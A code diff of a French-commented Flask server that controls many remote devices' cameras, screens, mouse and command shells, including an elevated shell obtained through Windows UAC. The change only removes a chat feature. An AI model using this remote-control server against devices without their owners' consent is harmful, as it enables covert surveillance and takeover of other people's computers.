@@ -1,5 +1,5 @@
 """
-Serveur de contrôle caméra / écran / shell / chat — API HTTP.
+Serveur de contrôle caméra / écran / shell — API HTTP.
 
 Ce serveur est le point central : il peut piloter PLUSIEURS clients
 (appareils) en même temps. Pour chaque appareil, les fonctionnalités
@@ -9,7 +9,6 @@ suivantes sont suivies indépendamment :
   - Souris : position remontée, clics en file
   - CMD Commandes : console persistante côté client, buffer roulant de sortie
   - CMD Commandes ADMIN : idem mais via UAC Windows (buffer séparé)
-  - Chat : vraie console visible côté client, historique de conversation
 
 L'interface de contrôle (server_gui) s'y connecte en HTTP.
 """
@@ -39,7 +38,6 @@ STREAM_NAMES = ("camera", "screen")
 MAX_PENDING_CLICKS = 50
 MAX_OUTPUT_BUFFER = 64_000
 MAX_PENDING_SHELL_INPUT = 20
-MAX_CHAT_HISTORY = 100
 
 
 @app.route("/health", methods=["GET"])
@@ -80,13 +78,6 @@ def _default_shell_state() -> dict:
         "admin_output_buffer": "",
         "admin_output_seq": 0,
         "admin_shell_input": [],
-
-        # --- Chat ---
-        "chat_out": [],
-        "chat_in": [],
-        "chat_history": [],
-        "chat_window_open": False,
-        "chat_window_cmd": "CLOSE",
     }
 
 
@@ -135,8 +126,6 @@ def get_command():
         # Rapport d'état du client vers le serveur
         if request.args.get("location_open") is not None:
             device["location"]["browser_open"] = request.args["location_open"] == "1"
-        if request.args.get("chat_window_open") is not None:
-            device["shell"]["chat_window_open"] = request.args["chat_window_open"] == "1"
         if request.args.get("cmd_console_open") is not None:
             device["shell"]["cmd_console_open"] = request.args["cmd_console_open"] == "1"
         if request.args.get("admin_console_open") is not None:
@@ -153,7 +142,6 @@ def get_command():
         commands["location"] = device["location"]["command"]
         commands["cmd_console"] = device["shell"]["cmd_console_cmd"]
         commands["cmd_admin_console"] = device["shell"]["admin_console_cmd"]
-        commands["chat_window"] = device["shell"]["chat_window_cmd"]
 
         pending_clicks = device["mouse"]["pending_clicks"]
         commands["mouse_click"] = pending_clicks.pop(0) if pending_clicks else None
@@ -163,9 +151,6 @@ def get_command():
 
         admin_input = device["shell"]["admin_shell_input"]
         commands["shell_admin_input"] = admin_input.pop(0) if admin_input else None
-
-        chat_out = device["shell"]["chat_out"]
-        commands["chat_message"] = chat_out.pop(0) if chat_out else None
 
         return jsonify({"commands": commands})
 
@@ -757,90 +742,6 @@ def shell_admin_output_latest():
             "console_open": sh["admin_console_open"],
             "admin_refused": sh["admin_refused"],
         })
-
-
-# ---------------------------------------------------------------------
-# Chat
-# ---------------------------------------------------------------------
-
-@app.route("/api/shell/chat_window", methods=["POST"])
-def shell_chat_window():
-    payload = request.get_json(force=True, silent=True) or {}
-    device_id = payload.get("device_id")
-    command = payload.get("command")
-    if not device_id or command not in ("OPEN", "CLOSE"):
-        return jsonify({"error": "device_id et command (OPEN/CLOSE) requis"}), 400
-    with devices_lock:
-        device = devices.get(device_id)
-        if device is None:
-            return jsonify({"error": "appareil inconnu"}), 404
-        device["shell"]["chat_window_cmd"] = command
-    return jsonify({"ok": True})
-
-
-@app.route("/api/shell/chat_window/state", methods=["GET"])
-def shell_chat_window_state():
-    device_id = request.args.get("device_id")
-    if not device_id:
-        return jsonify({"error": "device_id manquant"}), 400
-    with devices_lock:
-        device = devices.get(device_id)
-        if device is None:
-            return jsonify({"error": "appareil inconnu"}), 404
-        return jsonify({
-            "command": device["shell"]["chat_window_cmd"],
-            "window_open": device["shell"]["chat_window_open"],
-        })
-
-
-@app.route("/api/shell/chat", methods=["POST"])
-def shell_chat():
-    payload = request.get_json(force=True, silent=True) or {}
-    device_id = payload.get("device_id")
-    message = payload.get("message")
-    if not device_id or message is None:
-        return jsonify({"error": "device_id et message requis"}), 400
-    with devices_lock:
-        device = devices.get(device_id)
-        if device is None:
-            return jsonify({"error": "appareil inconnu"}), 404
-        sh = device["shell"]
-        sh["chat_out"].append({"message": message[:4000], "ts": time.time()})
-        sh["chat_history"].append({"role": "moi", "text": message, "ts": time.time()})
-        sh["chat_history"] = sh["chat_history"][-MAX_CHAT_HISTORY:]
-    return jsonify({"ok": True})
-
-
-@app.route("/api/shell/result", methods=["POST"])
-def shell_result():
-    payload = request.get_json(force=True, silent=True) or {}
-    device_id = payload.get("device_id")
-    if not device_id:
-        return jsonify({"error": "device_id manquant"}), 400
-    with devices_lock:
-        device = _get_or_create_device(device_id)
-        sh = device["shell"]
-        if payload.get("type") == "chat":
-            msg = (payload.get("message") or "")[:4000]
-            sh["chat_in"].append({"message": msg, "ts": time.time()})
-            sh["chat_history"].append({"role": "client", "text": msg, "ts": time.time()})
-            sh["chat_history"] = sh["chat_history"][-MAX_CHAT_HISTORY:]
-    return jsonify({"ok": True})
-
-
-@app.route("/api/shell/results", methods=["GET"])
-def shell_results():
-    device_id = request.args.get("device_id")
-    if not device_id:
-        return jsonify({"error": "device_id manquant"}), 400
-    with devices_lock:
-        device = devices.get(device_id)
-        if device is None:
-            return jsonify({"error": "appareil inconnu"}), 404
-        sh = device["shell"]
-        data = {"chat_in": list(sh["chat_in"]), "chat_history": list(sh["chat_history"])}
-        sh["chat_in"].clear()
-    return jsonify(data)
 
 
 # ---------------------------------------------------------------------
